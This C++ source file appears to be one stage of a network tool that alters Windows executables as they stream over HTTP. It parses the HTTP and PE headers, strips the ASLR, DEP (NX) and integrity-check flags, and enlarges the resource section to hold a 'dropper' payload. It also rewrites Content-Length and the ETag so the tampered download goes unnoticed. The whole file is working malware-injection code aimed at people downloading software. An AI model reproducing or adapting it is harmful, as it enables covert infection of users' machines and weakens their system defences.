/*
 * ParseDOSHeader.cpp
 *
 *  Created on: May 3, 2010
 *      Author: daniele
 */

#include "Parsing.h"

#include <cstdlib> // for rand()
#include <cctype>  // for isalnum()
#include <algorithm> // for back_inserter
#include <string>
#include <sstream>

#include <boost/algorithm/string.hpp>
#include <boost/foreach.hpp>

inline DWORD alignTo( DWORD _size, DWORD _base_size )
{
	return ( ((_size + _base_size - 1) / _base_size) * _base_size );
}

inline DWORD alignToDWORD( DWORD _size )
{
	return (DWORD)( _size + ( sizeof(DWORD) - (_size % (sizeof(DWORD)))));
}


char rand_num() {
    static const char numbers[] = "0123456789";
    return numbers[ rand() % ( sizeof(numbers) - 1 ) ];
}

std::string rand_num_str(std::string::size_type size) {
    std::string s;
    s.reserve(size);
    generate_n(std::back_inserter(s), size, rand_num);
    return s;
}

void ParseHeaders::init()
{
	neededBytes() = sizeof(IMAGE_DOS_HEADER);
	triggeringOffset() = 0;
}

StateResult ParseHeaders::parse()
{
	// TODO parse HTTP header
	if (parseHTTPHeaders() == false)
		return NEED_MORE_DATA;

	if (parseDOSHeader() == false)
		return NEED_MORE_DATA;

	if (parseNTHeaders() == false)
		return NEED_MORE_DATA;

	if (parseSectionHeaders() == false)
		return NEED_MORE_DATA;

	return PARSED;
}

bool ParseHeaders::parseHTTPHeaders()
{
	std::stringstream httpHeader;
	httpHeader << context<StreamingMelter>().buffer()->const_data();

	std::string line;
	std::getline(httpHeader, line, '\n');

	if ( line.compare(0, 4, "HTTP") != 0 ) {
		DEBUG_MSG(D_DEBUG, "HTTP header not present.");
		return true;
	}

	DEBUG_MSG(D_DEBUG, "HTTP header: %s", line.c_str());
	httpHeaders_.push_back(line);

	while ( std::getline(httpHeader, line, '\n') ) {
		if ( line.compare("\r") == 0 ) {

			DEBUG_MSG(D_DEBUG, "End of HTTP headers.");

			// discard original HTTP header
			httpHeadersSize_ = httpHeader.tellg();
			DEBUG_MSG(D_DEBUG, "Size of HTTP headers: %d", httpHeadersSize_);

			context<StreamingMelter>().discardFromBuffer( httpHeadersSize_ );

			return true;

		}
                
		DEBUG_MSG(D_DEBUG, "HTTP header: %s", line.c_str());
		httpHeaders_.push_back(line);
                
      std::size_t found = line.find("Content-Length:");
		if (found != string::npos) {
			std::istringstream values(line);
			std::string content_length;
			std::size_t fileSize;
                        
			values >> content_length;
			values >> fileSize;
			context<StreamingMelter>().fileSize() = fileSize;
		}

	}

	httpHeaders_.erase( httpHeaders_.begin(), httpHeaders_.end() );

	DEBUG_MSG(D_INFO, "parsed HTTP headers.");

	return false;
}

bool ParseHeaders::parseDOSHeader()
{
	std::size_t offsetToHeader = 0;
	std::size_t neededBytes = offsetToHeader + sizeof(IMAGE_DOS_HEADER);
	if ( ! isDataAvailable( neededBytes ) ) {
		DEBUG_MSG(D_DEBUG, "not enough data for parsing, waiting for more.");
		return false;
	}

	dosHeader_ = (PIMAGE_DOS_HEADER) (context<StreamingMelter>().buffer()->const_data());
	DEBUG_MSG(D_VERBOSE, "parsing DOS header: %d", sizeof(IMAGE_DOS_HEADER));
	DEBUG_MSG(D_VERBOSE, "MAGIC: %04x", dosHeader_->e_magic);

	if (dosHeader_->e_magic != IMAGE_DOS_SIGNATURE) {
		throw parsing_error("Invalid DOS signature.");
	}

	DEBUG_MSG(D_VERBOSE, "offset tto NT Header: %08x", dosHeader_->e_lfanew);
	context<StreamingMelter>().offsets["ntHeader"] = dosHeader_->e_lfanew;

	return true;
}

bool ParseHeaders::parseNTHeaders()
{
	std::size_t offsetToHeader = dosHeader_->e_lfanew;
	std::size_t neededBytes = offsetToHeader + sizeof(IMAGE_NT_HEADERS);
	if ( ! isDataAvailable( neededBytes ) )
			return false;

	ntHeaders_ = (PIMAGE_NT_HEADERS)
			(context<StreamingMelter>().buffer()->data()
			+ dosHeader_->e_lfanew
			);



	if (!ntHeaders_)
		throw parsing_error("Invalid offset of NT header.");

	// signature
	if (ntHeaders_->Signature != IMAGE_NT_SIGNATURE)
		throw parsing_error("Invalid NT signature.");
	DEBUG_MSG(D_INFO, "Signature ... OK");

	// IA-32
	if ( ntHeaders_->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 )
		throw parsing_error("Executable is not for IA-32 systems.");
	DEBUG_MSG(D_INFO, "IA-32 ... OK");

	// Win32 GUI
	if ( ntHeaders_->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI )
		throw parsing_error("Executable is not a Win32 GUI application.");
	DEBUG_MSG(D_INFO, "Win32 GUI ... OK");

	DEBUG_MSG(D_DEBUG, "Section alignment ... %08x", ntHeaders_->OptionalHeader.SectionAlignment);
	DEBUG_MSG(D_DEBUG, "File alignment    ... %08x", ntHeaders_->OptionalHeader.FileAlignment);
	DEBUG_MSG(D_DEBUG, "SizeOfImage       ... %08x", ntHeaders_->OptionalHeader.SizeOfImage);

	return true;
}

bool ParseHeaders::parseSectionHeaders()
{
	std::size_t offsetToHeader = dosHeader_->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	std::size_t sectionHeadersBytes = ntHeaders_->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
	//std::size_t neededBytes = offsetToHeader + sectionHeadersBytes;
   std::size_t neededBytes = offsetToHeader + sectionHeadersBytes + 0x3000;
	if ( ! isDataAvailable( neededBytes ) ) {
		DEBUG_MSG(D_VERBOSE, "Not enough data for parsing section headers.");
		return false;
	}

   char *buffer = context<StreamingMelter>().buffer()->data();
   for (unsigned int i=0; i<neededBytes; i++)
   {
      if (!memcmp(&buffer[i], "_SFX_CAB_EXE_PATH", 17))
      {
         throw parsing_error("For security reason I'm not gonna melt cab files");
      }
   }

	std::size_t numberOfSections = ntHeaders_->FileHeader.NumberOfSections;
	DEBUG_MSG(D_INFO, "ParseHeaders::parseSectionHeaders: number of sections: %d", numberOfSections);

	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
	{
		if (!sectionHeader)
			throw parsing_error("Invalid section header.");

		DEBUG_MSG(D_VERBOSE, "Section %s", (PCHAR)sectionHeader->Name);
		DEBUG_MSG(D_VERBOSE, "\tRVA       : %08x", (std::size_t) sectionHeader->VirtualAddress);
		DEBUG_MSG(D_VERBOSE, "\tPtrToRaw  : %08x", (std::size_t) sectionHeader->PointerToRawData);
		DEBUG_MSG(D_VERBOSE, "\tVSize     : %08x", (std::size_t) sectionHeader->Misc.VirtualSize);
		DEBUG_MSG(D_VERBOSE, "\tSizeOfRaw : %08x", (std::size_t) sectionHeader->SizeOfRawData);

		context<StreamingMelter>().addSection(sectionHeader);
		++sectionHeader;
	}

	return true;
}

StateResult ParseHeaders::process()
{
	// DBGTRACE("CRASHING?", "", D_INFO);

	Dropper& dropper = context<StreamingMelter>().dropper();
	if (dropper.size() == 0)
		return PROCESSED;

	// Clear ASLR if enabled
	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
		DEBUG_MSG(D_INFO, "DYNAMIC_BASE set to safe value.");
		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	}

	// Clear NX_COMPAT if enabled
	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
		DEBUG_MSG(D_INFO, "NX_COMPAT set to safe value.");
		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	}

	// Reset bound import table if present
	if (ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
	{
		DEBUG_MSG(D_INFO, "BOUND IMPORT TABLE set to safe value.");
		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	}

	// Clear IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY
	if(ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
	{
		DEBUG_MSG(D_INFO, "IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY set to safe value.");
		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY;
	}

	// Change SizeOfImage accordingly
	ImageSectionHeader& lastSection = context<StreamingMelter>().lastSection();


	// save NT header for future reference
	PEInfo& pe = context<StreamingMelter>().pe();
	pe.ntHeader = *ntHeaders_;

	// locate TEXT section
	if ( context<StreamingMelter>().locateTextSection() == false )
		throw parsing_error("Unable to locate text section.");

	// locate RESOURCE section
	if ( context<StreamingMelter>().locateResourceSection() == false )
		throw parsing_error("Unable to locate resource section.");

	// modify RESOURCE section size and characteristics
	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
	ImageSectionHeader& rsrcHeader = context<StreamingMelter>().resourceSection();

	int rsrcFlag = 0;
	unsigned long prevPointerToRaw, prevSizeOfRaw, prevVirtualAddr, prevVirtualSize;
	std::size_t numberOfSections = context<StreamingMelter>().numberOfSections();
	DWORD predictedSizeOfImage = 0x1000;
	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
	{
		if (!sectionHeader)
			throw parsing_error("Invalid section header.");

		if (sectionHeader->VirtualAddress == rsrcHeader->VirtualAddress) 
		{
			if (sectionHeader->Misc.VirtualSize < sectionHeader->SizeOfRawData)
			{
				sectionHeader->Misc.VirtualSize = sectionHeader->Misc.VirtualSize + dropper.size();
				sectionHeader->SizeOfRawData = alignTo(sectionHeader->Misc.VirtualSize, context<StreamingMelter>().fileAlignment());
			}
			else
			{
				sectionHeader->Misc.VirtualSize = sectionHeader->Misc.VirtualSize + dropper.size();	
				sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
			}

			//sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
			//sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
			//sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;

			DEBUG_MSG(D_VERBOSE, "Resource section: %s", (PCHAR) rsrcHeader->Name);
			DEBUG_MSG(D_VERBOSE, "\tDropper size: %08x", dropper.size());
			DEBUG_MSG(D_VERBOSE, "\tSizeOfRawData changed to %08x", (std::size_t) sectionHeader->SizeOfRawData);
			DEBUG_MSG(D_VERBOSE, "\tVirtualSize change to %08x", (std::size_t) sectionHeader->Misc.VirtualSize);

			rsrcFlag = 1;
                        prevPointerToRaw = sectionHeader->PointerToRawData;
                        prevSizeOfRaw = sectionHeader->SizeOfRawData;
                        prevVirtualAddr = sectionHeader->VirtualAddress;
                        prevVirtualSize = sectionHeader->Misc.VirtualSize;
		}
		else if (rsrcFlag == 1)
		{
                        sectionHeader->PointerToRawData = prevPointerToRaw + prevSizeOfRaw;
                        sectionHeader->VirtualAddress = alignTo(prevVirtualAddr + prevVirtualSize, context<StreamingMelter>().sectionAlignment());

			prevPointerToRaw = sectionHeader->PointerToRawData;
			prevSizeOfRaw = sectionHeader->SizeOfRawData;
			prevVirtualAddr = sectionHeader->VirtualAddress;
			prevVirtualSize = sectionHeader->Misc.VirtualSize;
		}

		predictedSizeOfImage += alignTo(sectionHeader->Misc.VirtualSize, context<StreamingMelter>().sectionAlignment());

		++sectionHeader;
	}
	//printf("VA: %08x, SIZE: %08x, TOT: %08x\n", lastSection->VirtualAddress, lastSection->Misc.VirtualSize, lastSection->VirtualAddress + lastSection->Misc.VirtualSize);
	//DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize + dropper.size(), ntHeaders_->OptionalHeader.SectionAlignment );
	//DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize, ntHeaders_->OptionalHeader.SectionAlignment );
	DWORD sizeOfImageSkew = predictedSizeOfImage - ntHeaders_->OptionalHeader.SizeOfImage;
	ntHeaders_->OptionalHeader.SizeOfImage = predictedSizeOfImage;
	DEBUG_MSG(D_INFO, "SizeOfImage changed to %d", ntHeaders_->OptionalHeader.SizeOfImage);
	DEBUG_MSG(D_INFO, "Content-Length will differ by %d", sizeOfImageSkew);

	// locate entry point
	ImageSectionHeader& textHeader = context<StreamingMelter>().textSection();
	DWORD AddressOfEntryPoint = ntHeaders_->OptionalHeader.AddressOfEntryPoint;
	DWORD offsetToEntryPoint = textHeader->PointerToRawData + ( AddressOfEntryPoint - textHeader->VirtualAddress );

	DEBUG_MSG(D_VERBOSE, "Offset to entry point: %08x", offsetToEntryPoint);
	offsetToNext() = offsetToEntryPoint;

	sendHTTPHeaders(sizeOfImageSkew);

	return PROCESSED;
}

void ParseHeaders::sendHTTPHeaders(std::size_t sizeOfImageSkew)
{
    // send HTTP headers
    BOOST_FOREACH(std::string line, httpHeaders_) {
	bool bContentLen = false;
        // modify Content-Length according to predicted size
        std::size_t found = line.find("Content-Length:");
        if (found != string::npos) {
            std::ostringstream str;
            std::size_t finalSize = context<StreamingMelter > ().fileSize() + sizeOfImageSkew;
            str << "Content-Length: " << finalSize << "\r";
            line = str.str();
	    bContentLen = true;
            //DEBUG_MSG(D_DEBUG, "Content-Length is now %d", finalSize);
        }
        
        found = line.find("ETag:");
        if (found != string::npos) {
            line = "ETag: \"" + rand_num_str(10) + "\"\r";
        }
        
	if (bContentLen == false)
	{
        	DEBUG_MSG(D_DEBUG, "Sending HTTP header: %s", line.c_str());
	        context<StreamingMelter > ().complete(line.c_str(), line.size());
	        context<StreamingMelter > ().complete("\n", 1);
	}
    }

    if (httpHeaders_.size()) {
        // send empty line to signal end of headers
        context<StreamingMelter > ().complete("\r\n", 2);
    }
    
    // reset offset in buffer ... don't account for HTTP headers
    context<StreamingMelter > ().currentOffset() = 0;
}

sc::result ParseHeaders::transitToNext()
{
    return transit< ParseEntryPoint >();
}

ParseHeaders::ParseHeaders()
: DataState< ParseHeaders, Parsing >(), httpHeadersSize_(0)
{
}

ParseHeaders::~ParseHeaders()
{
}
